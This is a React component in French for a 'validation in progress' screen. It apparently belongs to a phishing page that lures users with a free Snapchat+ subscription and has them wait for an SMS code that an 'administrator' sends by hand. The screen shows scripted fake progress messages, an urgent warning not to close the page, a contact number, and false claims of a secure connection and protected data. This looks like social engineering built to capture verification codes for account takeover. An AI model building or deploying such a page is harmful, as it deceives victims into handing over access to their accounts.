import { motion } from "framer-motion";
import { Send, Clock, ExternalLink } from "lucide-react";
import { useState, useEffect } from "react";
import Logo from "@/components/Logo";

const formatPhone = (tel) => {
  return tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
};

const messages = [
  "Un administrateur traite votre demande, le code vous sera envoyé dans quelques instants.",
  "Vérification de votre numéro en cours...",
  "Préparation du code SMS...",
  "Nous contactons votre opérateur...",
  "Presque prêt, patience !",
];

export default function SuccessScreen({ data, adminInactive }) {
   const [messageIndex, setMessageIndex] = useState(0);

   useEffect(() => {
     const interval = setInterval(() => {
       setMessageIndex((prev) => (prev + 1) % messages.length);
     }, 4000);
     return () => clearInterval(interval);
   }, []);
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: "easeOut" }}
      className="w-full max-w-sm mx-auto">
      
      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">

        {/* Logo */}
        <div className="mb-6">
          <Logo />
        </div>

        {/* Sending icon */}
        <div className="flex justify-center mb-6">
          <div className="relative">
            <div className="w-20 h-20 bg-[#252538] rounded-2xl flex items-center justify-center">
              <Send className="w-9 h-9 text-foreground/80" />
            </div>
            {/* Animated loading ring */}
            <motion.div
              animate={{ rotate: 360 }}
              transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
              className="absolute -bottom-2 -right-2 w-8 h-8 rounded-full border-2 border-foreground/20 border-t-foreground/80" />
            
          </div>
        </div>

        {/* Validation text */}
        <h2 className="font-heading text-xl font-bold text-foreground mb-2">
          Validation en cours.
        </h2>
        <p className="text-muted-foreground text-sm mb-6">
          Votre demande a bien été reçue pour le{" "}
          <span className="text-foreground font-bold">{formatPhone(data?.telephone)}</span>
        </p>

        {/* Warning banner */}
        <div className="bg-red-500/15 border border-red-500/40 rounded-xl px-4 py-3.5 mb-6">
          <p className="text-red-400 font-bold text-sm tracking-wide">
            ⚠️ NE FERMEZ PAS CETTE PAGE ⚠️
          </p>
          <p className="text-red-400/80 text-xs mt-0.5">
            Vous perdriez votre code SMS
          </p>
        </div>

        {/* Dots loader */}
        <div className="flex justify-center gap-2 mb-5">
          {[0, 1, 2].map((i) =>
          <motion.div
            key={i}
            className="w-2.5 h-2.5 rounded-full bg-muted-foreground/40"
            animate={{ opacity: [0.3, 1, 0.3] }}
            transition={{ duration: 1.2, repeat: Infinity, delay: i * 0.25 }} />

          )}
        </div>

        {/* Info text - Dynamic */}
        {adminInactive ? (
          <p className="text-orange-400 text-sm mb-5 leading-relaxed px-2 font-semibold">
            ⏳ Aucun admin disponible pour le moment. Votre demande sera traitée dès que possible.
          </p>
        ) : (
          <motion.p
            key={messageIndex}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.4 }}
            className="text-muted-foreground text-sm mb-5 leading-relaxed px-2 h-12 flex items-center justify-center"
          >
            {messages[messageIndex]}
          </motion.p>
        )}

        {/* Wait time */}
        <div className="bg-secondary/50 border border-border rounded-xl px-4 py-3.5 mb-4 flex items-center justify-center gap-2">
          <Clock className="w-4 h-4 text-primary" />
          <span className="font-bold text-foreground text-sm">
            Temps d'attente estimé : ~5 min
          </span>
        </div>

        {/* Lien de suivi */}
        <a
          href={`/suivi?id=${typeof sessionStorage !== "undefined" ? sessionStorage.getItem("submissionId") || "" : ""}`}
          target="_blank"
          rel="noopener noreferrer"
          className="block w-full bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 mb-6 text-center hover:bg-primary/20 transition-colors"
        >
          <span className="flex items-center justify-center gap-2 text-primary text-sm font-semibold">
            <ExternalLink className="w-4 h-4" /> Suivre ma demande en temps réel
          </span>
        </a>

        {/* Contact */}
        <p className="text-muted-foreground text-xs mb-8 leading-relaxed">
          Si la demande prend trop de temps, contactez-nous sur notre numéro officiel{" "}
          <a href="tel:0756863425" className="text-primary font-semibold">07 56 86 34 25</a>
        </p>

        {/* Security */}
        <p className="text-muted-foreground/50 text-xs mb-4">
          🔒 Connexion sécurisée • Données protégées
        </p>

        {/* Footer */}
        <p className="text-muted-foreground/40 text-xs leading-relaxed">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>
    </motion.div>);

}